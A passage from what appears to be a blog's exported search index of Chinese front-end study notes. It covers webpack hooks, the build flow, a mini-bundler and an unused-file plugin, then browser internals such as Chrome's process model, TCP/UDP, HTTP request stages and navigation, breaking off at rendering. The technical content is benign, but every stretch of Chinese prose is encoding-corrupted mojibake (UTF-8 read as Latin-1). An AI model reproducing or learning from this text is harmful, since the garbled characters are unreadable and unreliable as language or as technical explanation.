ä¸€ä¸ªæ–°çš„ç¼–è¯‘ï¼ˆcompilationï¼‰åˆ›å»ºä¹‹åŽ emit AsyncSeriesHook ç”Ÿæˆèµ„æºåˆ° output ç›®å½•ä¹‹å‰ done SyncHook ç¼–è¯‘ï¼ˆcompilationï¼‰å®Œæˆ Compilation Hooks Hook Type è°ƒç”¨ buildModule SyncHook åœ¨æ¨¡å—æž„å»ºå¼€å§‹ä¹‹å‰è§¦å‘ finishModule SyncHook æ‰€æœ‰æ¨¡å—éƒ½å®Œæˆæž„å»º optimize SyncHook ä¼˜åŒ–é˜¶æ®µå¼€å§‹æ—¶è§¦å‘ ç®€å•å®žçŽ°ä¸€ä¸ª webpack ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œé€šè¿‡ fs å°†æ–‡ä»¶ä¸­çš„å†…å®¹è¯»å–å‡ºæ¥ï¼› å†é€šè¿‡ babylon è§£æžä»£ç èŽ·å– ASTï¼Œç›®çš„æ˜¯ä¸ºäº†åˆ†æžä»£ç ä¸­æ˜¯å¦è¿˜å¼•å…¥äº†åˆ«çš„æ–‡ä»¶ï¼› é€šè¿‡ dependencies æ¥å­˜å‚¨æ–‡ä»¶ä¸­çš„ä¾èµ–ï¼Œç„¶åŽå†å°† AST è½¬åŒ–æˆ ES5 ä»£ç ï¼› æœ€åŽå‡½æ•°è¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡ä¸­åŒ…å«å½“å‰æ–‡ä»¶è·¯å¾„ã€å½“å‰æ–‡ä»¶ä¾èµ–å’Œå½“å‰æ–‡ä»¶è½¬åŒ–åŽçš„ä»£ç ï¼› è¿™æ ·éåŽ†æ‰€æœ‰ä¾èµ–æ–‡ä»¶ï¼Œæž„å»ºå‡ºä¸€ä¸ªå‡½æ•°å‚æ•°å¯¹è±¡ï¼› å¯¹è±¡çš„å±žæ€§å°±æ˜¯å½“å‰æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œå±žæ€§å€¼æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°ä½“æ˜¯å½“å‰æ–‡ä»¶ä¸‹çš„ä»£ç ï¼Œå‡½æ•°æŽ¥å—ä¸‰ä¸ªå‚æ•° moduleã€exportsã€requireï¼› æŽ¥ä¸‹æ¥å°±æ˜¯æž„é€ ä¸€ä¸ªä½¿ç”¨å‚æ•°çš„å‡½æ•° requireï¼Œè°ƒç”¨ require(â€˜./entry.jsâ€™)å°±å¯ä»¥æ‰§è¡Œ ./entry.js å¯¹åº”çš„å‡½æ•°å¹¶æ‰§è¡Œï¼Œé€šè¿‡ module.export æ–¹å¼å¯¼å‡ºå†…å®¹ã€‚ å®žçŽ°å°åž‹æ‰“åŒ…å·¥å…· webpack æ‰“åŒ…æµç¨‹ä¸“ä¸šç‰ˆï¼š é¦–å…ˆåˆå¹¶ webpack config æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°ï¼Œåˆå¹¶ä¸º optionsï¼› å°† options ä¼ å…¥ Compiler æž„é€ æ–¹æ³•ï¼Œç”Ÿæˆ compiler å®žä¾‹ï¼Œå¹¶å®žä¾‹åŒ–äº† Compiler ä¸Šçš„ Hooksï¼› compiler å¯¹è±¡æ‰§è¡Œ run æ–¹æ³•ï¼Œå¹¶è‡ªåŠ¨è§¦å‘ beforeRunã€runã€beforeCompileã€compile ç­‰å…³é”® Hooksï¼› è°ƒç”¨ Compilation æž„é€ æ–¹æ³•åˆ›å»º compilation å¯¹è±¡ï¼Œcompilation è´Ÿè´£ç®¡ç†æ‰€æœ‰æ¨¡å—å’Œå¯¹åº”çš„ä¾èµ–ï¼Œåˆ›å»ºå®ŒæˆåŽè§¦å‘ make Hookï¼› æ‰§è¡Œ compilation.addEntry() æ–¹æ³•ï¼ŒaddEntry ç”¨äºŽåˆ†æžæ‰€æœ‰å…¥å£æ–‡ä»¶ï¼Œé€çº§é€’å½’è§£æžï¼Œè°ƒç”¨ NormalModuleFactory æ–¹æ³•ï¼Œä¸ºæ¯ä¸ªä¾èµ–ç”Ÿæˆä¸€ä¸ª Module å®žä¾‹ï¼Œå¹¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è§¦å‘ beforeResolveã€resolverã€afterResolveã€module ç­‰å…³é”® Hooksï¼› å°†ç¬¬ 5 æ­¥ä¸­ç”Ÿæˆçš„ Module å®žä¾‹ä½œä¸ºå…¥å‚ï¼Œæ‰§è¡Œ Compilation.addModule() å’Œ Compilation.buildModule() æ–¹æ³•é€’å½’åˆ›å»ºæ¨¡å—å¯¹è±¡å’Œä¾èµ–æ¨¡å—å¯¹è±¡ã€‚ è°ƒç”¨ seal æ–¹æ³•ç”Ÿæˆä»£ç ï¼Œæ•´ç†è¾“å‡ºä¸»æ–‡ä»¶å’Œ chunkï¼Œå¹¶æœ€ç»ˆè¾“å‡ºï¼› æ˜“æ‡‚ç‰ˆï¼š åˆå§‹åŒ–å‚æ•°ï¼šä»Žé…ç½®æ–‡ä»¶åˆ° Shell è¯­å¥ä¸­è¯»å–ä¸Žåˆå¹¶å‚æ•°ï¼Œå¾—å‡ºæœ€ç»ˆçš„å‚æ•°ï¼› å¼€å§‹ç¼–è¯‘ï¼šç”¨ä¸Šä¸€æ­¥çš„å‚æ•°åˆå§‹åŒ– Compiler å¯¹è±¡ï¼ŒåŠ è½½æ‰€æœ‰é…ç½®çš„æ’ä»¶ï¼Œæ‰§è¡Œå¯¹è±¡çš„ run æ–¹æ³•å¼€å§‹æ‰§è¡Œç¼–è¯‘ï¼› ç¡®å®šå…¥å£ï¼šæ ¹æ®é…ç½®ä¸­çš„ entry æ‰¾å‡ºæ‰€æœ‰çš„å…¥å£æ–‡ä»¶ï¼› ç¼–è¯‘æ¨¡å—ï¼šä»Žå…¥å£æ–‡ä»¶å‡ºå‘ï¼Œè°ƒç”¨æ‰€æœ‰é…ç½®çš„ loader å¯¹æ¨¡å—è¿›è¡Œç¿»è¯‘ï¼Œæ‰¾å‡ºè¯¥æ¨¡å—ä¾èµ–çš„æ¨¡å—ï¼Œå†é€’å½’æœ¬æ­¥éª¤ç›´åˆ°æ‰€æœ‰å…¥å£ä¾èµ–çš„æ–‡ä»¶éƒ½ç»è¿‡æœ¬æ­¥éª¤çš„å¤„ç†ï¼› å®Œæˆæ¨¡å—ç¼–è¯‘ï¼šåœ¨ç»è¿‡ç¬¬ 4 æ­¥ä½¿ç”¨ Loader ç¿»è¯‘å®Œæ‰€æœ‰æ¨¡å—åŽï¼Œå¾—åˆ°äº†æ¯ä¸ªæ¨¡å—è¢«ç¿»è¯‘åŽçš„æœ€ç»ˆå†…å®¹ä»¥åŠä»–ä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼› è¾“å‡ºèµ„æºï¼šæ ¹æ®å…¥å£å’Œæ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œç»„è£…ä¸€ä¸ªä¸ªåŒ…å«å¾ˆå¤šæ¨¡å—çš„ Chunk ï¼Œå†æŠŠæ¯ä¸ª Chunk è½¬æ¢æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶åŠ å…¥åˆ°è¾“å‡ºåˆ—è¡¨ï¼Œè¿™æ­¥æ˜¯å¯ä»¥ä¿®æ”¹è¾“å‡ºå†…å®¹çš„æœ€åŽæœºä¼šï¼› è¾“å‡ºå®Œæˆï¼šåœ¨ç¡®å®šå¥½è¾“å‡ºå†…å®¹åŽï¼Œæ ¹æ®é…ç½®ç¡®å®šè¾“å‡ºçš„è·¯å¾„å’Œæ–‡ä»¶åï¼ŒæŠŠæ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿã€‚ Tapable åŽŸç†Tapable æ˜¯ Webpack æ ¸å¿ƒå·¥å…·åº“ï¼Œå®ƒæä¾›äº†æ‰€æœ‰ Hook çš„æŠ½è±¡ç±»å®šä¹‰ã€‚ å‚è€ƒï¼šwebpack æ‰“åŒ…åŽŸç† ? çœ‹å®Œè¿™ç¯‡ä½ å°±æ‡‚äº† !æ·±å…¥æµ…å‡º webpack å®žçŽ°ä¸€ä¸ª webpack æ’ä»¶findUnusedfile æ’ä»¶æ˜¯é€’å½’éåŽ†å…¥å£æ–‡ä»¶å®ƒçš„æ¨¡å—ä¾èµ–å›¾ï¼Œä¿å­˜éåŽ†ç»“æžœå¹¶ä¸”åŽ»é‡ã€æŽ’é™¤ node_modules ä¸­çš„æ¨¡å—ï¼Œæœ€ç»ˆæ‰¾å‡ºæ‰€æœ‰é¡¹ç›®ä½¿ç”¨çš„æ–‡ä»¶é›†åˆ Aã€‚é€šè¿‡ fastGlob æ’ä»¶æ­£åˆ™é€’å½’æŸ¥æ‰¾é¡¹ç›®ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶é›†åˆ Bï¼Œé›†åˆ B å‡åŽ» A/B äº¤é›†å³å¯å¾—åˆ°é¡¹ç›®ä¸­æœªä½¿ç”¨åˆ°çš„æ–‡ä»¶ã€‚ éåŽ†ä¸åŒçš„æ¨¡å—æœ‰ä¸åŒçš„åˆ†æžä¾èµ–æ–¹å¼ï¼š jsã€tsã€jsxã€tsx æ¨¡å—æ ¹æ® es module çš„ import æˆ–è€… commonjs çš„ require æ¥ç¡®å®šä¾èµ–ï¼› cssã€lessã€scss æ¨¡å—æ ¹æ® @import å’Œ url()çš„è¯­æ³•æ¥ç¡®å®šä¾èµ–ï¼› éåŽ† js æ¨¡å—éœ€è¦åˆ†æžå…¶ä¸­çš„ import å’Œ require ä¾èµ–ã€‚æˆ‘ä»¬ä½¿ç”¨ Babel æ¥åšï¼š è¯»å–æ–‡ä»¶å†…å®¹ï¼› æ ¹æ®åŽç¼€åæ˜¯.jsxã€.ts æ¥å†³å®šæ˜¯å¦å¯ç”¨ typescriptã€jsx çš„ parse æ’ä»¶ï¼› ä½¿ç”¨ babel/parse æŠŠä»£ç è½¬æˆ ASTï¼› ä½¿ç”¨ babel/traverse å¯¹ AST è¿›è¡ŒéåŽ†ï¼› å¤„ç† ImportDeclaration å’Œ CallExpress çš„ ASTï¼Œä»Žä¸­æå–ä¾èµ–è·¯å¾„ï¼› å¯¹ä¾èµ–è·¯å¾„è¿›è¡Œå¤„ç†ï¼Œå˜æˆçœŸå®žè·¯å¾„ä¹‹åŽï¼Œç»§ç»­éåŽ†è¯¥è·¯å¾„çš„æ¨¡å—ï¼› éåŽ† css æ¨¡å—éœ€è¦åˆ†æž @import å’Œ url()ã€‚æˆ‘ä»¬ä½¿ç”¨ postcss æ¥åšï¼š è¯»å–æ–‡ä»¶å†…å®¹ï¼› æ ¹æ®æ–‡ä»¶è·¯å¾„æ˜¯.lessã€scss æ¥å†³å®šæ˜¯å¦å¯åŠ¨ lessã€scss çš„è¯­æ³•æ’ä»¶ï¼› ä½¿ç”¨ postcss.parse æŠŠæ–‡ä»¶å†…å®¹è½¬åŒ–æˆ ASTï¼› éåŽ†@import èŠ‚ç‚¹ï¼Œæå–ä¾èµ–è·¯å¾„ï¼› éåŽ†æ ·å¼å£°æ˜Žï¼ˆdeclarationï¼‰ï¼Œè¿‡æ»¤å‡º url()çš„å€¼ï¼Œæå–ä¾èµ–çš„è·¯å¾„ï¼› å¯¹ä¾èµ–è·¯å¾„è¿›è¡Œå¤„ç†ï¼Œå˜æˆçœŸå®žè·¯å¾„ä¹‹åŽï¼Œç»§ç»­éåŽ†è¯¥è·¯å¾„çš„æ¨¡å—ï¼› æ”¹æˆ webpack æ’ä»¶ï¼Œwebpack å°†èµ„æºè½¬æ¢è¾“å‡ºï¼Œä¸­é—´æ˜¯å¯ä»¥èŽ·å–åˆ°æ‰€æœ‰ä¾èµ–å…³ç³»å›¾å’Œæ‰€æœ‰ä½¿ç”¨èµ„æºã€‚emit hook æ˜¯åœ¨æ‰€æœ‰æºæ–‡ä»¶è½¬æ¢å’Œç»„è£…å·²ç»å®Œæˆï¼Œåœ¨è¿™é‡Œå¯ä»¥è¯»å–åˆ°æœ€ç»ˆå°†è¾“å‡ºçš„èµ„æºã€ä»£ç å—ã€æ¨¡å—åŠå…¶ä¾èµ–ã€‚compilaton.fileDependcies å±žæ€§å¯ä»¥èŽ·å–æ‰€æœ‰ä¾èµ–æ–‡ä»¶ï¼Œè¿›ä¸€æ­¥ç®€åŒ–äº†æˆ‘è‡ªå·±åŽ»é€’å½’éåŽ†æŸ¥æ‰¾ä¾èµ–æ¨¡å—ã€‚]]></content>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµè§ˆå™¨å·¥ä½œåŽŸç†ä¸Žå®žè·µ]]></title>
    <url>%2F2021%2F05%2F31%2Fbrowser-working-principle%2F</url>
    <content type="text"><![CDATA[å‰è¨€ä½œä¸ºä¸€åå‰ç«¯ erï¼Œæ—¥å¸¸å·¥ä½œæ‰“äº¤é“æœ€å¤šï¼ˆä¹‹ä¸€ï¼‰çš„èŽ«è¿‡äºŽç†Ÿæ‚‰è€Œåˆé™Œç”Ÿçš„æµè§ˆå™¨äº†ï¼Œç†Ÿæ‚‰æ˜¯æ¯å¤©éƒ½ä¼šåŸºäºŽæµè§ˆå™¨çš„åº”ç”¨å±‚é¢ä¹‹ä¸Šç ä¸šåŠ¡ï¼Œé™Œç”Ÿæ˜¯å¾ˆå¤šäººå¯èƒ½è·Ÿæˆ‘ä¸€æ ·ä¸ç†Ÿæ‚‰å…¶å†…éƒ¨è¿è¡ŒåŽŸç†ï¼Œæ¯”å¦‚ js æ˜¯æ€Žæ ·è¿è¡Œçš„å‘¢ï¼Ÿç²¾ç¾Žæ ·å¼é¡µé¢æ˜¯æ€Žæ ·æ¸²æŸ“åˆ°ç”µè„‘å±å¹•çš„å‘¢ï¼Ÿåœ¨å¼€æ”¾çš„äº’è”ç½‘å®ƒåˆæ˜¯æ€Žæ ·ä¿è¯æˆ‘ä»¬ä¸ªäººä¿¡æ¯å®‰å…¨çš„å‘¢ï¼Ÿå¸¦ç€ç§ç§ç–‘äº‘å¼€å§‹è‚æŽå…µè€å¸ˆçš„ã€Šæµè§ˆå™¨åŸºæœ¬åŽŸç†ä¸Žå®žè·µã€‹ï¼Œä¸å¾—ä¸è¯´ï¼Œå¤§å®¶ä¹‹ä½œï¼Œé€šä¿—æ˜“æ‡‚ï¼Œå±‚å±‚æ‹¨å¼€äº‘é›¾è§é’å¤©ï¼Œä¸‹é¢å°±ï¼ˆéžå¸¸éžå¸¸ï¼‰ç®€å•æ€»ç»“ä¸€ä¸‹ã€‚ æµè§ˆå™¨å·¥ä½œåŽŸç†ä¸Žå®žè·µChrome æž¶æž„ï¼šä»…ä»…æ‰“å¼€äº† 1 ä¸ªé¡µé¢ï¼Œä¸ºä»€ä¹ˆæœ‰ 4 ä¸ªè¿›ç¨‹çº¿ç¨‹å’Œè¿›ç¨‹åŒºåˆ«ï¼šå¤šçº¿ç¨‹å¯ä»¥å¹¶è¡Œå¤„ç†ä»»åŠ¡ï¼Œçº¿ç¨‹ä¸èƒ½å•ç‹¬å­˜åœ¨ï¼Œå®ƒæ˜¯ç”±è¿›ç¨‹æ¥å¯åŠ¨å’Œç®¡ç†çš„ã€‚ä¸€ä¸ªè¿›ç¨‹æ˜¯ä¸€ä¸ªç¨‹åºçš„è¿è¡Œå®žä¾‹ã€‚ çº¿ç¨‹å’Œè¿›ç¨‹çš„å…³ç³»ï¼š1ã€è¿›ç¨‹ä¸­ä»»æ„ä¸€çº¿ç¨‹æ‰§è¡Œå‡ºé”™ï¼Œéƒ½ä¼šå¯¼è‡´æ•´ä¸ªè¿›ç¨‹çš„å´©æºƒã€‚2ã€çº¿ç¨‹ä¹‹é—´å…±äº«è¿›ç¨‹ä¸­çš„æ•°æ®ã€‚3ã€å½“ä¸€ä¸ªè¿›ç¨‹å…³é—­åŽï¼Œæ“ä½œç³»ç»Ÿä¼šå›žæ”¶è¿›ç¨‹æ‰€å ç”¨çš„å†…å­˜ã€‚4ã€è¿›ç¨‹ä¹‹é—´çš„å†…å®¹ç›¸äº’éš”ç¦»ã€‚ å•è¿›ç¨‹ æµè§ˆå™¨ï¼š1ã€ä¸ç¨³å®šã€‚å•è¿›ç¨‹ä¸­çš„æ’ä»¶ã€æ¸²æŸ“çº¿ç¨‹å´©æºƒå¯¼è‡´æ•´ä¸ªæµè§ˆå™¨å´©æºƒã€‚2ã€ä¸æµç•…ã€‚è„šæœ¬ï¼ˆæ­»å¾ªçŽ¯ï¼‰æˆ–æ’ä»¶ä¼šä½¿æµè§ˆå™¨å¡é¡¿ã€‚3ã€ä¸å®‰å…¨ã€‚æ’ä»¶å’Œè„šæœ¬å¯ä»¥èŽ·å–åˆ°æ“ä½œç³»ç»Ÿä»»æ„èµ„æºã€‚ å¤šè¿›ç¨‹æµè§ˆå™¨ï¼š1ã€è§£å†³ä¸ç¨³å®šã€‚è¿›ç¨‹ç›¸äº’éš”ç¦»ï¼Œä¸€ä¸ªé¡µé¢æˆ–è€…æ’ä»¶å´©æºƒæ—¶ï¼Œå½±å“ä»…ä»…æ—¶å½“å‰æ’ä»¶æˆ–è€…é¡µé¢ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–é¡µé¢ã€‚2ã€è§£å†³ä¸æµç•…ã€‚è„šæœ¬é˜»å¡žå½“å‰é¡µé¢æ¸²æŸ“è¿›ç¨‹ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–é¡µé¢ã€‚3ã€è§£å†³ä¸å®‰å…¨ã€‚é‡‡ç”¨å¤šè¿›ç¨‹æž¶æž„ä½¿ç”¨æ²™ç®±ã€‚æ²™ç®±çœ‹æˆæ—¶æ“ä½œç³»ç»Ÿç»™è¿›ç¨‹ä¸Šæ¥ä¸€æŠŠé”ï¼Œæ²™ç®±çš„ç¨‹åºå¯ä»¥è¿è¡Œï¼Œä½†æ˜¯ä¸èƒ½åœ¨ç¡¬ç›˜ä¸Šå†™å…¥ä»»ä½•æ•°æ®ï¼Œä¹Ÿä¸èƒ½åœ¨æ•æ„Ÿä½ç½®è¯»å–ä»»ä½•æ•°æ®ã€‚ å¤šè¿›ç¨‹æž¶æž„ï¼šåˆ†ä¸º æµè§ˆå™¨è¿›ç¨‹ã€æ¸²æŸ“è¿›ç¨‹ã€GPU è¿›ç¨‹ã€ç½‘ç»œè¿›ç¨‹ã€æ’ä»¶è¿›ç¨‹ã€‚ ç¼ºç‚¹ï¼š1ã€èµ„æºå ç”¨é«˜ã€‚2ã€ä½“ç³»æž¶æž„å¤æ‚ã€‚ é¢å‘æœåŠ¡æž¶æž„ï¼šæŠŠåŽŸæ¥çš„å„ç§æ¨¡å—é‡æž„æˆç‹¬ç«‹çš„æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡éƒ½å¯ä»¥åœ¨ç‹¬ç«‹çš„è¿›ç¨‹ä¸­è¿è¡Œï¼Œè®¿é—®æœåŠ¡å¿…é¡»ä½¿ç”¨å®šä¹‰å¥½çš„æŽ¥å£ï¼Œé€šè¿‡ IPC é€šè®¯ï¼Œä½¿å¾—ç³»ç»Ÿæ›´å†…èšã€æ¾è€¦åˆã€æ˜“ç»´æŠ¤å’Œæ‹“å±•ã€‚ TCP åè®®ï¼šå¦‚ä½•ä¿è¯é¡µé¢æ–‡ä»¶èƒ½è¢«å®Œæ•´é€è¾¾æµè§ˆå™¨] IP å¤´æ˜¯ IP æ•°æ®åŒ…å¼€å¤´çš„ä¿¡æ¯ï¼ŒåŒ…å« IP ç‰ˆæœ¬ã€æº IP åœ°å€ã€ç›®æ ‡ IP åœ°å€ã€ç”Ÿå­˜æ—¶é—´ç­‰ä¿¡æ¯ï¼› UDP å¤´ä¸­é™¤äº†ç›®çš„ç«¯å£ï¼Œè¿˜æœ‰æºç«¯å£å·ç­‰ä¿¡æ¯ï¼› IP è´Ÿè´£æŠŠæ•°æ®åŒ…é€è¾¾ç›®çš„ä¸»æœºï¼› UDP è´Ÿè´£æŠŠæ•°æ®åŒ…é€è¾¾å…·ä½“åº”ç”¨ï¼› å¯¹äºŽé”™è¯¯çš„æ•°æ®åŒ…ï¼ŒUDP ä¸æä¾›é‡å‘æœºåˆ¶ï¼Œåªæ˜¯ä¸¢å¼ƒå½“å‰çš„åŒ…ï¼Œä¸èƒ½ä¿è¯æ•°æ®çš„å¯é æ€§ï¼Œä½†æ˜¯ä¼ è¾“é€Ÿåº¦éžå¸¸å—ï¼› TCP å¤´é™¤äº†åŒ…å«äº†ç›®æ ‡ç«¯å£å’Œæœ¬æœºç«¯å£å·å¤–ï¼Œè¿˜æä¾›äº†ç”¨äºŽæŽ’åºçš„åºåˆ—å·ï¼Œä¿è¯äº†æ•°æ®å®Œæ•´åœ°ä¼ è¾“ï¼Œå®ƒçš„è¿žæŽ¥å¯åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼šå»ºç«‹è¿žæŽ¥ã€ä¼ è¾“æ•°æ®å’Œæ–­å¼€è¿žæŽ¥ï¼› HTTP è¯·æ±‚æµç¨‹ï¼šä¸ºä»€ä¹ˆå¾ˆå¤šç«™ç‚¹ç¬¬äºŒæ¬¡æ‰“å¼€é€Ÿåº¦ä¼šå¾ˆå¿« æµè§ˆå™¨ä¸­çš„ HTTP è¯·æ±‚ä»Žå‘èµ·åˆ°ç»“æŸä¸€å…±ç»åŽ†å¦‚ä¸‹å…«ä¸ªé˜¶æ®µï¼šæž„å»ºè¯·æ±‚ã€æŸ¥æ‰¾ç¼“å­˜ã€å‡†å¤‡ IP å’Œç«¯å£ã€ç­‰å¾… TCP é˜Ÿåˆ—ã€å»ºç«‹ TCP è¿žæŽ¥ã€å‘èµ· HTTP è¯·æ±‚ã€æœåŠ¡å™¨å¤„ç†è¯·æ±‚ã€æœåŠ¡å™¨è¿”å›žè¯·æ±‚å’Œæ–­å¼€è¿žæŽ¥ï¼› æž„å»ºè¯·æ±‚ã€‚æµè§ˆå™¨æž„å»ºè¯·æ±‚è¡Œï¼Œæž„å»ºå¥½åŽï¼Œå‡†å¤‡å‘èµ·ç½‘ç»œè¯·æ±‚ï¼› æŸ¥æ‰¾ç¼“å­˜ã€‚åœ¨çœŸæ­£æ³•å™¨è¯·æ±‚å‰æµè§ˆå™¨ä¼šæŸ¥è¯¢ç¼“å­˜ä¸­æ˜¯å¦æœ‰è¯·æ±‚èµ„æºå‰¯æœ¬ï¼Œæœ‰åˆ™æ‹¦æˆªè¯·æ±‚ï¼Œè¿”å›žèµ„æºå‰¯æœ¬ï¼Œå¦åˆ™è¿›å…¥ç½‘ç»œè¯·æ±‚ï¼› å‡†å¤‡ IP åœ°å€å’Œç«¯å£ã€‚HTTP ç½‘ç»œè¯·æ±‚éœ€è¦å’ŒæœåŠ¡å™¨å»ºç«‹ TCP è¿žæŽ¥ï¼Œè€Œå»ºç«‹ TCP è¿žæŽ¥éœ€è¦å‡†å¤‡ IP åœ°å€å’Œç«¯å£å·ï¼Œæµè§ˆå™¨éœ€è¦è¯·æ±‚ DNS è¿”å›žåŸŸåå¯¹åº”çš„ IPï¼ŒåŒæ—¶ä¼šç¼“å­˜åŸŸåè§£æžç»“æžœï¼Œä¾›ä¸‹æ¬¡æŸ¥è¯¢ä½¿ç”¨ï¼› ç­‰å¾… TCP é˜Ÿåˆ—ã€‚Chrome æœºåˆ¶ï¼ŒåŒä¸€ä¸ªåŸŸååŒæ—¶æœ€å¤šåªèƒ½å»ºç«‹ 6 ä¸ª TCP è¿žæŽ¥ï¼› å»ºç«‹ TCP è¿žæŽ¥ã€‚TCP é€šè¿‡â€œä¸‰æ¬¡æ¡æ‰‹â€å»ºç«‹è¿žæŽ¥ï¼Œä¼ è¾“æ•°æ®ï¼Œâ€œå››æ¬¡æŒ¥æ‰‹â€æ–­å¼€è¿žæŽ¥ï¼› å‘é€ HTTP è¯·æ±‚ã€‚å»ºç«‹ TCP è¿žæŽ¥åŽï¼Œæµè§ˆå™¨å°±å¯ä»¥å’ŒæœåŠ¡å™¨è¿›è¡Œ HTTP æ•°æ®ä¼ è¾“äº†ï¼Œé¦–å…ˆä¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚è¡Œï¼Œç„¶åŽä»¥è¯·æ±‚å¤´å½¢å¼å‘é€ä¸€äº›å…¶ä»–ä¿¡æ¯ï¼Œå¦‚æžœæ˜¯ POST è¯·æ±‚è¿˜ä¼šå‘é€è¯·æ±‚ä½“ï¼› æœåŠ¡å™¨å¤„ç†è¯·æ±‚ã€‚é¦–å…ˆæœåŠ¡å™¨ä¼šè¿”å›žå“åº”è¡Œï¼ŒéšåŽï¼ŒæœåŠ¡å™¨å‘æµè§ˆå™¨å‘é€å“åº”å¤´å’Œå“åº”ä½“ã€‚é€šå¸¸æœåŠ¡å™¨è¿”å›žæ•°æ®ï¼Œå°±è¦å…³é—­ TCP è¿žæŽ¥ï¼Œå¦‚æžœè¯·æ±‚å¤´æˆ–è€…å“åº”å¤´æœ‰ Connection:keep-alive TCP ä¿æŒæ‰“å¼€çŠ¶æ€ï¼› å¯¼èˆªæµç¨‹ï¼šä»Žè¾“å…¥ URL åˆ°é¡µé¢å±•ç¤ºè¿™ä¸­é—´å‘ç”Ÿäº†ä»€ä¹ˆ ç”¨æˆ·è¾“å…¥ URL å¹¶å›žè½¦ æµè§ˆå™¨è¿›ç¨‹æ£€æŸ¥ URLï¼Œç»„è£…åè®®ï¼Œæž„æˆå®Œæ•´ URL æµè§ˆå™¨è¿›ç¨‹é€šè¿‡è¿›ç¨‹é€šä¿¡ï¼ˆIPCï¼‰æŠŠ URL è¯·æ±‚å‘é€ç»™ç½‘ç»œè¿›ç¨‹ ç½‘ç»œè¿›ç¨‹æŽ¥æ”¶åˆ° URL è¯·æ±‚åŽæ£€æŸ¥æœ¬åœ°ç¼“å­˜æ˜¯å¦ç¼“å­˜äº†è¯¥è¯·æ±‚èµ„æºï¼Œå¦‚æžœæœ‰åˆ™å°†è¯¥èµ„æºè¿”å›žç»™æµè§ˆå™¨è¿›ç¨‹ å¦‚æžœæ²¡æœ‰ï¼Œç½‘ç»œè¿›ç¨‹å‘ web æœåŠ¡å™¨å‘èµ· http è¯·æ±‚ï¼ˆç½‘ç»œè¯·æ±‚ï¼‰ï¼Œè¯·æ±‚æµç¨‹å¦‚ä¸‹ï¼š è¿›è¡Œ DNS è§£æžï¼ŒèŽ·å–æœåŠ¡å™¨ IP åœ°å€ï¼Œç«¯å£ åˆ©ç”¨ IP åœ°å€å’ŒæœåŠ¡å™¨å»ºç«‹ tcp è¿žæŽ¥ æž„å»ºè¯·æ±‚å¤´ä¿¡æ¯ å‘é€è¯·æ±‚å¤´ä¿¡æ¯ æœåŠ¡å™¨å“åº”åŽï¼Œç½‘ç»œè¿›ç¨‹æŽ¥æ”¶å“åº”å¤´å’Œå“åº”ä¿¡æ¯ï¼Œå¹¶è§£æžå“åº”å†…å®¹ ç½‘ç»œè¿›ç¨‹è§£æžå“åº”æµç¨‹ï¼š æ£€æŸ¥çŠ¶æ€ç ï¼Œå¦‚æžœæ˜¯ 301/302ï¼Œåˆ™éœ€è¦é‡å®šå‘ï¼Œä»Ž Location è‡ªåŠ¨è¯»å–åœ°å€ï¼Œé‡æ–°è¿›è¡Œç¬¬ 4 æ­¥ï¼Œå¦‚æžœæ˜¯ 200ï¼Œåˆ™ç»§ç»­å¤„ç†è¯·æ±‚ 200 å“åº”å¤„ç†ï¼šæ£€æŸ¥å“åº”ç±»åž‹ Content-Typeï¼Œå¦‚æžœæ˜¯å­—èŠ‚æµç±»åž‹ï¼Œåˆ™å°†è¯¥è¯·æ±‚æäº¤ç»™ä¸‹è½½ç®¡ç†å™¨ï¼Œè¯¥å¯¼èˆªæµç¨‹ç»“æŸï¼Œä¸å†è¿›è¡ŒåŽç»­æ¸²æŸ“ã€‚å¦‚æžœæ˜¯ html åˆ™é€šçŸ¥æµè§ˆå™¨è¿›ç¨‹å‡†å¤‡æ¸²æŸ“è¿›ç¨‹è¿›è¡Œæ¸²æŸ“ å‡†å¤‡æ¸²æŸ“è¿›ç¨‹ æµè§ˆå™¨è¿›ç¨‹æ£€æŸ¥å½“å‰ URL æ˜¯å¦å’Œä¹‹å‰æ‰“å¼€çš„æ¸²æŸ“è¿›ç¨‹æ ¹åŸŸåæ˜¯å¦ç›¸åŒï¼Œå¦‚æžœç›¸åŒï¼Œåˆ™å¤ç”¨åŽŸæ¥çš„è¿›ç¨‹ï¼Œå¦‚æžœä¸åŒï¼Œåˆ™å¼€å¯æ–°çš„æ¸²æŸ“è¿›ç¨‹ ä¼ è¾“æ•°æ®ã€æ›´æ–°çŠ¶æ€ æ¸²æŸ“è¿›ç¨‹å‡†å¤‡å¥½åŽï¼Œæµè§ˆå™¨å‘æ¸²æŸ“è¿›ç¨‹å‘èµ·â€œæäº¤æ–‡æ¡£â€çš„æ¶ˆæ¯ï¼Œæ¸²æŸ“è¿›ç¨‹æŽ¥æ”¶åˆ°æ¶ˆæ¯å’Œç½‘ç»œè¿›ç¨‹å»ºç«‹ä¼ è¾“æ•°æ®çš„â€œç®¡é“â€ æ¸²æŸ“è¿›ç¨‹æŽ¥æ”¶å®Œæ•°æ®åŽï¼Œå‘æµè§ˆå™¨å‘é€â€œç¡®è®¤æäº¤â€ æµè§ˆå™¨è¿›ç¨‹æŽ¥æ”¶åˆ°ç¡®è®¤æ¶ˆæ¯åŽ engine æµè§ˆå™¨ç•Œé¢çŠ¶æ€ï¼šå®‰å…¨ã€åœ°å€ URLã€å‰è¿›åŽé€€çš„åŽ†å²çŠ¶æ€ã€æ›´æ–° web é¡µé¢ æ¸²æŸ“æµç¨‹ï¼ˆä¸Šï¼‰ï¼šHTMLã€CSS å’Œ JavaScript 